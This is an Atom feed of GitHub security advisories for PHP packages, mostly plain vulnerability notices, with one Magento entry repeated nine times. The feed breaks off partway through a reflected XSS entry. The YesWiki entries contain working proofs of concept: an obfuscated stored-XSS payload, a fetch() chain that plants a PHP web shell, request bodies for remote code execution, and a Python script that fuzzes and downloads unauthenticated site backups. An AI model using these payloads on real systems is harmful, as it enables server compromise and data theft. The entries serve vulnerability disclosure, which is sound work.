<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/composer.rss</id>
    <title>Security Advisory for PHP packages hosted at packagist.org</title>
    <updated>2025-05-02T07:01:20.414Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
    <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[magento/community-edition] Magento Improper Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-rr2g-rrjj-xw86</id>
        <link href="https://github.com/advisories/GHSA-rr2g-rrjj-xw86"/>
        <updated>2025-05-01T19:31:14.000Z</updated>
        <content type="html"><![CDATA[<p>Magento versions 2.4.7-p4, 2.4.6-p9, 2.4.5-p11, 2.4.4-p12, 2.4.8-beta2 and earlier are affected by an Improper Authorization vulnerability that could result in Privilege escalation. An attacker could leverage this vulnerability to bypass security measures and gain unauthorized access. Exploitation of this issue does not require user interaction.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27188">https://nvd.nist.gov/vuln/detail/CVE-2025-27188</a></li>
<li><a href="https://helpx.adobe.com/security/products/magento/apsb25-26.html">https://helpx.adobe.com/security/products/magento/apsb25-26.html</a></li>
<li><a href="https://github.com/advisories/GHSA-rr2g-rrjj-xw86">https://github.com/advisories/GHSA-rr2g-rrjj-xw86</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rr2g-rrjj-xw86</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-08T21:31:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[magento/community-edition] Magento Improper Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-rr2g-rrjj-xw86</id>
        <link href="https://github.com/advisories/GHSA-rr2g-rrjj-xw86"/>
        <updated>2025-05-01T19:31:14.000Z</updated>
        <content type="html"><![CDATA[<p>Magento versions 2.4.7-p4, 2.4.6-p9, 2.4.5-p11, 2.4.4-p12, 2.4.8-beta2 and earlier are affected by an Improper Authorization vulnerability that could result in Privilege escalation. An attacker could leverage this vulnerability to bypass security measures and gain unauthorized access. Exploitation of this issue does not require user interaction.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27188">https://nvd.nist.gov/vuln/detail/CVE-2025-27188</a></li>
<li><a href="https://helpx.adobe.com/security/products/magento/apsb25-26.html">https://helpx.adobe.com/security/products/magento/apsb25-26.html</a></li>
<li><a href="https://github.com/advisories/GHSA-rr2g-rrjj-xw86">https://github.com/advisories/GHSA-rr2g-rrjj-xw86</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rr2g-rrjj-xw86</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-08T21:31:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[magento/community-edition] Magento Improper Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-rr2g-rrjj-xw86</id>
        <link href="https://github.com/advisories/GHSA-rr2g-rrjj-xw86"/>
        <updated>2025-05-01T19:31:14.000Z</updated>
        <content type="html"><![CDATA[<p>Magento versions 2.4.7-p4, 2.4.6-p9, 2.4.5-p11, 2.4.4-p12, 2.4.8-beta2 and earlier are affected by an Improper Authorization vulnerability that could result in Privilege escalation. An attacker could leverage this vulnerability to bypass security measures and gain unauthorized access. Exploitation of this issue does not require user interaction.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27188">https://nvd.nist.gov/vuln/detail/CVE-2025-27188</a></li>
<li><a href="https://helpx.adobe.com/security/products/magento/apsb25-26.html">https://helpx.adobe.com/security/products/magento/apsb25-26.html</a></li>
<li><a href="https://github.com/advisories/GHSA-rr2g-rrjj-xw86">https://github.com/advisories/GHSA-rr2g-rrjj-xw86</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rr2g-rrjj-xw86</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-08T21:31:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[magento/community-edition] Magento Improper Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-rr2g-rrjj-xw86</id>
        <link href="https://github.com/advisories/GHSA-rr2g-rrjj-xw86"/>
        <updated>2025-05-01T19:31:14.000Z</updated>
        <content type="html"><![CDATA[<p>Magento versions 2.4.7-p4, 2.4.6-p9, 2.4.5-p11, 2.4.4-p12, 2.4.8-beta2 and earlier are affected by an Improper Authorization vulnerability that could result in Privilege escalation. An attacker could leverage this vulnerability to bypass security measures and gain unauthorized access. Exploitation of this issue does not require user interaction.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27188">https://nvd.nist.gov/vuln/detail/CVE-2025-27188</a></li>
<li><a href="https://helpx.adobe.com/security/products/magento/apsb25-26.html">https://helpx.adobe.com/security/products/magento/apsb25-26.html</a></li>
<li><a href="https://github.com/advisories/GHSA-rr2g-rrjj-xw86">https://github.com/advisories/GHSA-rr2g-rrjj-xw86</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rr2g-rrjj-xw86</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-08T21:31:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[magento/community-edition] Magento Improper Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-rr2g-rrjj-xw86</id>
        <link href="https://github.com/advisories/GHSA-rr2g-rrjj-xw86"/>
        <updated>2025-05-01T19:31:14.000Z</updated>
        <content type="html"><![CDATA[<p>Magento versions 2.4.7-p4, 2.4.6-p9, 2.4.5-p11, 2.4.4-p12, 2.4.8-beta2 and earlier are affected by an Improper Authorization vulnerability that could result in Privilege escalation. An attacker could leverage this vulnerability to bypass security measures and gain unauthorized access. Exploitation of this issue does not require user interaction.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27188">https://nvd.nist.gov/vuln/detail/CVE-2025-27188</a></li>
<li><a href="https://helpx.adobe.com/security/products/magento/apsb25-26.html">https://helpx.adobe.com/security/products/magento/apsb25-26.html</a></li>
<li><a href="https://github.com/advisories/GHSA-rr2g-rrjj-xw86">https://github.com/advisories/GHSA-rr2g-rrjj-xw86</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rr2g-rrjj-xw86</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-08T21:31:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[magento/community-edition] Magento Improper Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-rr2g-rrjj-xw86</id>
        <link href="https://github.com/advisories/GHSA-rr2g-rrjj-xw86"/>
        <updated>2025-05-01T19:31:14.000Z</updated>
        <content type="html"><![CDATA[<p>Magento versions 2.4.7-p4, 2.4.6-p9, 2.4.5-p11, 2.4.4-p12, 2.4.8-beta2 and earlier are affected by an Improper Authorization vulnerability that could result in Privilege escalation. An attacker could leverage this vulnerability to bypass security measures and gain unauthorized access. Exploitation of this issue does not require user interaction.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27188">https://nvd.nist.gov/vuln/detail/CVE-2025-27188</a></li>
<li><a href="https://helpx.adobe.com/security/products/magento/apsb25-26.html">https://helpx.adobe.com/security/products/magento/apsb25-26.html</a></li>
<li><a href="https://github.com/advisories/GHSA-rr2g-rrjj-xw86">https://github.com/advisories/GHSA-rr2g-rrjj-xw86</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rr2g-rrjj-xw86</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-08T21:31:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[magento/community-edition] Magento Improper Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-rr2g-rrjj-xw86</id>
        <link href="https://github.com/advisories/GHSA-rr2g-rrjj-xw86"/>
        <updated>2025-05-01T19:31:14.000Z</updated>
        <content type="html"><![CDATA[<p>Magento versions 2.4.7-p4, 2.4.6-p9, 2.4.5-p11, 2.4.4-p12, 2.4.8-beta2 and earlier are affected by an Improper Authorization vulnerability that could result in Privilege escalation. An attacker could leverage this vulnerability to bypass security measures and gain unauthorized access. Exploitation of this issue does not require user interaction.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27188">https://nvd.nist.gov/vuln/detail/CVE-2025-27188</a></li>
<li><a href="https://helpx.adobe.com/security/products/magento/apsb25-26.html">https://helpx.adobe.com/security/products/magento/apsb25-26.html</a></li>
<li><a href="https://github.com/advisories/GHSA-rr2g-rrjj-xw86">https://github.com/advisories/GHSA-rr2g-rrjj-xw86</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rr2g-rrjj-xw86</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-08T21:31:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[magento/community-edition] Magento Improper Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-rr2g-rrjj-xw86</id>
        <link href="https://github.com/advisories/GHSA-rr2g-rrjj-xw86"/>
        <updated>2025-05-01T19:31:14.000Z</updated>
        <content type="html"><![CDATA[<p>Magento versions 2.4.7-p4, 2.4.6-p9, 2.4.5-p11, 2.4.4-p12, 2.4.8-beta2 and earlier are affected by an Improper Authorization vulnerability that could result in Privilege escalation. An attacker could leverage this vulnerability to bypass security measures and gain unauthorized access. Exploitation of this issue does not require user interaction.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27188">https://nvd.nist.gov/vuln/detail/CVE-2025-27188</a></li>
<li><a href="https://helpx.adobe.com/security/products/magento/apsb25-26.html">https://helpx.adobe.com/security/products/magento/apsb25-26.html</a></li>
<li><a href="https://github.com/advisories/GHSA-rr2g-rrjj-xw86">https://github.com/advisories/GHSA-rr2g-rrjj-xw86</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rr2g-rrjj-xw86</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-08T21:31:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[magento/community-edition] Magento Improper Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-rr2g-rrjj-xw86</id>
        <link href="https://github.com/advisories/GHSA-rr2g-rrjj-xw86"/>
        <updated>2025-05-01T19:31:14.000Z</updated>
        <content type="html"><![CDATA[<p>Magento versions 2.4.7-p4, 2.4.6-p9, 2.4.5-p11, 2.4.4-p12, 2.4.8-beta2 and earlier are affected by an Improper Authorization vulnerability that could result in Privilege escalation. An attacker could leverage this vulnerability to bypass security measures and gain unauthorized access. Exploitation of this issue does not require user interaction.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27188">https://nvd.nist.gov/vuln/detail/CVE-2025-27188</a></li>
<li><a href="https://helpx.adobe.com/security/products/magento/apsb25-26.html">https://helpx.adobe.com/security/products/magento/apsb25-26.html</a></li>
<li><a href="https://github.com/advisories/GHSA-rr2g-rrjj-xw86">https://github.com/advisories/GHSA-rr2g-rrjj-xw86</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rr2g-rrjj-xw86</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-08T21:31:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[adodb/adodb-php] SQL injection in ADOdb PostgreSQL driver pg_insert_id() method]]></title>
        <id>https://github.com/advisories/GHSA-8x27-jwjr-8545</id>
        <link href="https://github.com/advisories/GHSA-8x27-jwjr-8545"/>
        <updated>2025-05-01T13:59:51.000Z</updated>
        <content type="html"><![CDATA[<p>Improper escaping of a query parameter may allow an attacker to execute arbitrary SQL statements when the code using ADOdb connects to a PostgreSQL database and calls pg_insert_id() with user-supplied data.</p>
<p>Note that the indicated Severity corresponds to a worst-case usage scenario.</p>
<h3 id="impact">Impact</h3>
<p>PostgreSQL drivers (postgres64, postgres7, postgres8, postgres9).</p>
<h3 id="patches">Patches</h3>
<p>Vulnerability is fixed in ADOdb 5.22.9 (11107d6d6e5160b62e05dff8a3a2678cf0e3a426).</p>
<h3 id="workarounds">Workarounds</h3>
<p>Only pass controlled data to pg_insert_id() method's $fieldname parameter, or escape it with pg_escape_identifier() first.</p>
<h3 id="credits">Credits</h3>
<p>Thanks to Marco Nappi (@mrcnpp) for reporting this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ADOdb/ADOdb/security/advisories/GHSA-8x27-jwjr-8545">https://github.com/ADOdb/ADOdb/security/advisories/GHSA-8x27-jwjr-8545</a></li>
<li><a href="https://github.com/ADOdb/ADOdb/issues/1070">https://github.com/ADOdb/ADOdb/issues/1070</a></li>
<li><a href="https://github.com/ADOdb/ADOdb/commit/11107d6d6e5160b62e05dff8a3a2678cf0e3a426">https://github.com/ADOdb/ADOdb/commit/11107d6d6e5160b62e05dff8a3a2678cf0e3a426</a></li>
<li><a href="https://github.com/advisories/GHSA-8x27-jwjr-8545">https://github.com/advisories/GHSA-8x27-jwjr-8545</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8x27-jwjr-8545</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-05-01T13:59:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[showdoc/showdoc] ShowDoc unrestricted file upload vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-6jmr-r7p6-f5wr</id>
        <link href="https://github.com/advisories/GHSA-6jmr-r7p6-f5wr"/>
        <updated>2025-04-30T17:31:59.000Z</updated>
        <content type="html"><![CDATA[<p>An unrestricted file upload vulnerability in ShowDoc caused by improper validation of file extension allows execution of arbitrary PHP, leading to remote code execution. This issue affects ShowDoc: before 2.8.7.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-0520">https://nvd.nist.gov/vuln/detail/CVE-2025-0520</a></li>
<li><a href="https://github.com/star7th/showdoc/pull/1059">https://github.com/star7th/showdoc/pull/1059</a></li>
<li><a href="https://github.com/vulhub/vulhub/tree/master/showdoc/CNVD-2020-26585">https://github.com/vulhub/vulhub/tree/master/showdoc/CNVD-2020-26585</a></li>
<li><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2020-26585">https://www.cnvd.org.cn/flaw/show/CNVD-2020-26585</a></li>
<li><a href="https://github.com/advisories/GHSA-6jmr-r7p6-f5wr">https://github.com/advisories/GHSA-6jmr-r7p6-f5wr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6jmr-r7p6-f5wr</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-04-29T21:31:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[yeswiki/yeswiki] YesWiki Stored XSS Vulnerability in Comments ]]></title>
        <id>https://github.com/advisories/GHSA-59x8-cvxh-3mm4</id>
        <link href="https://github.com/advisories/GHSA-59x8-cvxh-3mm4"/>
        <updated>2025-04-29T20:27:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A stored cross-site scripting (XSS) vulnerability was discovered in the application’s comments feature. This issue allows a malicious actor to inject JavaScript payloads that are stored and later executed in the browser of any user viewing the affected comment.</p>
<p>The XSS occurs because the application fails to properly sanitize or encode user input submitted to the comments. Notably, the application sanitizes or does not allow execution of <code>&lt;script&gt;</code> tags, but does not account for payloads obfuscated using JavaScript block comments like <code>/* JavaScriptPayload */</code>. </p>
<h3 id="poc">PoC</h3>
<p>Navigate to a site and page that allows comments and place this in the comments section and submit it: </p>
<p><code>/*&lt;script&gt;alert('pizzapower')&lt;/script&gt;*/</code></p>
<p>Upon submitting to the page, it will run. And then upon every page visit, it will run. </p>
<h3 id="impact">Impact</h3>
<p>An attacker can run arbitrary JS in the victim's browser (any user that visits the page with the comments). This can be chained to do many malicious actions, such as to achieve RCE when chained with another vulnerability, e.g.: </p>
<pre><code>/*&lt;script&gt;fetch("/?api/templates/custom-presets/anhtyjik.php",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"primary-color=%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E&amp;secondary-color-1=%23d8604c&amp;secondary-color-2=%23d78958&amp;neutral-color=%234e5056&amp;neutral-soft-color=%2357575c&amp;neutral-light-color=%23f2f2f2&amp;main-text-fontsize=17px&amp;main-text-fontfamily=%22Nunito%22%2C+sans-serif&amp;main-title-fontfamily='Nunito'%2C+sans-serif"});&lt;/script&gt;*/
</code></pre>
<p>Then you can visit <code>http://localhost:8085/custom/css-presets/anhtyjik.php?cmd=id</code> and see the output of the ID command.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/YesWiki/yeswiki/security/advisories/GHSA-59x8-cvxh-3mm4">https://github.com/YesWiki/yeswiki/security/advisories/GHSA-59x8-cvxh-3mm4</a></li>
<li><a href="https://github.com/YesWiki/yeswiki/commit/0d4efc880a727599fa4f6d7a64cc967afe475530">https://github.com/YesWiki/yeswiki/commit/0d4efc880a727599fa4f6d7a64cc967afe475530</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-46346">https://nvd.nist.gov/vuln/detail/CVE-2025-46346</a></li>
<li><a href="https://github.com/advisories/GHSA-59x8-cvxh-3mm4">https://github.com/advisories/GHSA-59x8-cvxh-3mm4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-59x8-cvxh-3mm4</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-29T14:49:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[yeswiki/yeswiki] YesWiki Remote Code Execution via Arbitrary PHP File Write and Execution]]></title>
        <id>https://github.com/advisories/GHSA-88xg-v53p-fpvf</id>
        <link href="https://github.com/advisories/GHSA-88xg-v53p-fpvf"/>
        <updated>2025-04-29T20:27:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An arbitrary file write can be used to write a file with a PHP extension, which then can be browsed to in order to execute arbitrary code on the server. </p>
<p>All testing was performed on a local docker setup running the latest version of the application.</p>
<h3 id="poc">PoC</h3>
<p>Proof of Concept</p>
<p>Navigate to <code>http://localhost:8085/?LookWiki</code> which allows you to click <code>Create a new Graphical configuration</code> where you specify some parameters and then click <code>Save</code>. </p>
<p><img alt="LookWiki" src="https://github.com/user-attachments/assets/11c638ec-b700-483a-91fb-2d83107c2c69"></p>
<p>After clicking save, this request is made (most headers removed for clarity): </p>
<pre><code>POST /?api/templates/custom-presets/test.css HTTP/1.1
Host: localhost:8085

primary-color=%230c5d6a&amp;secondary-color-1=%23d8604c&amp;secondary-color-2=%23d78958&amp;neutral-color=%234e5056&amp;neutral-soft-color=%2357575c&amp;neutral-light-color=%23f2f2f2&amp;main-text-fontsize=17px&amp;main-text-fontfamily=%22Nunito%22%2C+sans-serif&amp;main-title-fontfamily='Nunito'%2C+sans-serif
</code></pre>
<p>This request writes the file <code>test.css</code> to disk with the contents (abbreviated)</p>
<pre><code>:root {
  --primary-color: #0c5d6a;
  --secondary-color-1: #d8604c;
  --secondary-color-2: #d78958;
  --neutral-color: #4e5056;
  --neutral-soft-color: #57575c;
  --neutral-light-color: #f2f2f2;
  --main-text-fontsize: 17px;
  --main-text-fontfamily: "Nunito", sans-serif;
  --main-title-fontfamily: 'Nunito', sans-serif;
}
</code></pre>
<p>To exploit this, utilize a proxy tool to intercept the the first request and change the filename extension to <code>.php</code> and add arbitrary PHP code in for one of the request body parameters. </p>
<p>e.g. <code>primary-color=%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E</code></p>
<p>Now the file <code>pizzapower.php</code> is written to <code>/var/www/html/custom/css-presets/pizzapower.php</code> and it starts with this, where the PHP code is present. </p>
<pre><code>:root {
  --primary-color: &lt;?php system($_GET['cmd']); ?&gt;;
  --secondary-color-1: #d8604c;
  --secondary-color-2: #d78958;
  --neutral-color: #4e5056;
  --neutral-soft-color: #57575c;
  --neutral-light-color: #f2f2f2;
  --main-text-fontsize: 17px;
  --main-text-fontfamily: "Nunito", sans-serif;
  --main-title-fontfamily: 'Nunito', sans-serif;
}
</code></pre>
<p>Then, simply visit the file with a <code>cmd</code> parameter included. </p>
<pre><code>http://localhost:8085/custom/css-presets/pizzapower.php?cmd=id
</code></pre>
<p>And the HTTP response will contain the output of our command. Notably this request can be performed unauthenticated (the creation of the file requires auth, though). </p>
<pre><code>:root {
  --primary-color: uid=501(yeswiki) gid=501 groups=501
;
  --secondary-color-1: #d8604c;
  --secondary-color-2: #d78958;
  --neutral-color: #4e5056;
  --neutral-soft-color: #57575c;
  --neutral-light-color: #f2f2f2;
  --main-text-fontsize: 17px;
  --main-text-fontfamily: "Nunito", sans-serif;
  --main-title-fontfamily: 'Nunito', sans-serif;
}
</code></pre>
<p><img alt="injection" src="https://github.com/user-attachments/assets/6567d500-23b9-4587-a166-3b49878446e7"></p>
<h3 id="impact">Impact</h3>
<p>Full compromise of the server. Can potentially be performed unwittingly by a user subjected to the previously reported (or future) XSS vulnerabilities. </p>
<h2 id="fixes">Fixes</h2>
<p>Amongst others: </p>
<p>Restrict file extensions: Only allow a safelist of extensions (e.g., .css) when saving files via this feature.
Harden server config: Disable PHP execution in user-writable directories</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/YesWiki/yeswiki/security/advisories/GHSA-88xg-v53p-fpvf">https://github.com/YesWiki/yeswiki/security/advisories/GHSA-88xg-v53p-fpvf</a></li>
<li><a href="https://github.com/YesWiki/yeswiki/commit/8fe5275a78dc7e0f9c242baa3cbac6b5ac1cc066">https://github.com/YesWiki/yeswiki/commit/8fe5275a78dc7e0f9c242baa3cbac6b5ac1cc066</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-46347">https://nvd.nist.gov/vuln/detail/CVE-2025-46347</a></li>
<li><a href="https://github.com/advisories/GHSA-88xg-v53p-fpvf">https://github.com/advisories/GHSA-88xg-v53p-fpvf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-88xg-v53p-fpvf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-29T14:45:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[yeswiki/yeswiki] YesWiki Vulnerable to Unauthenticated Site Backup Creation and Download]]></title>
        <id>https://github.com/advisories/GHSA-wc9g-6j9w-hr95</id>
        <link href="https://github.com/advisories/GHSA-wc9g-6j9w-hr95"/>
        <updated>2025-04-30T17:26:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The request to commence a site backup can be performed without authentication. Then these backups can also be downloaded without authentication. </p>
<p>The archives are created with a predictable filename, so a malicious user could create an archive and then download the archive without being authenticated. </p>
<h3 id="details">Details</h3>
<p>Create an installation using the instructions found in the docker folder of the repository, setup the site, and then send the request to create an archive, which you do not need to be authenticated for: </p>
<pre><code>POST /?api/archives HTTP/1.1
Host: localhost:8085

action=startArchive&amp;params%5Bsavefiles%5D=true&amp;params%5Bsavedatabase%5D=true&amp;callAsync=true
</code></pre>
<p>Then to retrieve it, make a simple <code>GET</code> request like to the correct URL: </p>
<pre><code>http://localhost:8085/?api/archives/2025-04-12T14-34-01_archive.zip
</code></pre>
<p>A malicious attacker could simply fuzz this filename.</p>
<h3 id="poc">PoC</h3>
<p>Here is a python script to fuzz this: </p>
<pre><code>#!/usr/bin/env python3

import requests
import argparse
import datetime
import time
from urllib.parse import urljoin
from email.utils import parsedate_to_datetime
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# Hardcoded proxy config for Burp Suite
BURP_PROXIES = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def send_post_request(base_url, use_proxy=False):
    url = urljoin(base_url, "/?api/archives")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    }

    data = {
        "action": "startArchive",
        "params[savefiles]": "true",
        "params[savedatabase]": "true",
        "callAsync": "true"
    }

    proxies = BURP_PROXIES if use_proxy else None
    response = requests.post(url, headers=headers, data=data, proxies=proxies, verify=False)
    print(f"[+] Archive start response code: {response.status_code}")

    server_date = response.headers.get("Date")
    if server_date:
        ts = parsedate_to_datetime(server_date)
        print(f"[✓] Server time (from Date header): {ts.strftime('%Y-%m-%d %H:%M:%S')} UTC")
        return ts
    else:
        print("[!] Server did not return a Date header, falling back to local UTC.")
        return datetime.datetime.utcnow()

def try_download_files(base_url, timestamp, use_proxy=False):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    }

    proxies = BURP_PROXIES if use_proxy else None
    print("[*] Trying to download the archive with timestamp fuzzing (±10 seconds)...")

    base_ts = timestamp + datetime.timedelta(hours=2)

    time.sleep(30)  # delay to generate the archive

    for offset in range(-4, 15):
        ts = base_ts + datetime.timedelta(seconds=offset)
        filename = ts.strftime("%Y-%m-%dT%H-%M-%S_archive.zip")
        url = urljoin(base_url, f"/?api/archives/{filename}")
        print(f"[&gt;] Trying: {url}")
        r = requests.get(url, headers=headers, proxies=proxies, verify=False)

        if r.status_code == 200 and r.headers.get("Content-Type", "").startswith("application/zip"):
            print(f"[✓] Archive found and downloaded: {filename}")
            with open(filename, "wb") as f:
                f.write(r.content)
            return

    print("[!] No archive found within the fuzzed window.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Trigger archive and fetch resulting file with timestamp fuzzing.")
    parser.add_argument("host", help="Base host URL, e.g., http://localhost:8085")
    parser.add_argument("-p", "--proxy", action="store_true", help="Route requests through Burp Suite proxy at 127.0.0.1:8080")
    args = parser.parse_args()

    ts = send_post_request(args.host, use_proxy=args.proxy)
    print(f"[+] Archive request sent at (UTC): {ts.strftime('%Y-%m-%d %H:%M:%S')}")

    try_download_files(args.host, ts, use_proxy=args.proxy)
</code></pre>
<h3 id="impact">Impact</h3>
<p>Denial of Service - A malicious attacker could simply make numerous requests to create archives and fill up the file system with archives. </p>
<p>Site Compromise - A malicious attacker can download the archive which will contain sensitive site information.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/YesWiki/yeswiki/security/advisories/GHSA-wc9g-6j9w-hr95">https://github.com/YesWiki/yeswiki/security/advisories/GHSA-wc9g-6j9w-hr95</a></li>
<li><a href="https://github.com/YesWiki/yeswiki/commit/0d4efc880a727599fa4f6d7a64cc967afe475530">https://github.com/YesWiki/yeswiki/commit/0d4efc880a727599fa4f6d7a64cc967afe475530</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-46348">https://nvd.nist.gov/vuln/detail/CVE-2025-46348</a></li>
<li><a href="https://github.com/advisories/GHSA-wc9g-6j9w-hr95">https://github.com/advisories/GHSA-wc9g-6j9w-hr95</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wc9g-6j9w-hr95</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-04-29T14:41:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[yeswiki/yeswiki] YesWiki Vulnerable to Unauthenticated Reflected Cross-site Scripting]]></title>
        <id>https://github.com/advisories/GHSA-2f8p-qqx2-gwr2</id>
        <link href="https://github.com/advisories/GHSA-2f8p-qqx2-gwr2"/>
        <updated>2025-04-29T20:27:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Reflected XSS has been detected in the file upload form. Vulnerability can be exploited without authentication</p>
<p>This Proof of Concept has been performed using the followings:</p>
<ul>
<li>YesWiki v4.5.3 (doryphore-dev branch)</li>
<li>Docker environnment (docker/docker-compose.yml)</li>
</ul>
<h3 id="vulnerable-code">Vulnerable code</h3>
